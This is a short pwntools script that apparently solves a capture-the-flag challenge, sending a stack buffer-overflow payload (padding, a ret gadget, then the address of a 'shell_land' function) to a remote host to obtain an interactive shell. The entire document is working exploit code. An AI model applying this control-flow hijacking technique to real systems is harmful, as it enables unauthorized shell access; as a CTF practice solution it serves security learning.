from pwn import *

context.binary = elf = ELF('./vacation1')
context.log_level = 'debug'
io = remote('tjc.tf', 31680)
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
to_fill = 0x10 + 8

payload = b'A' * to_fill + p64(ret) + p64(elf.symbols['shell_land'])
io.sendline(payload)
io.interactive()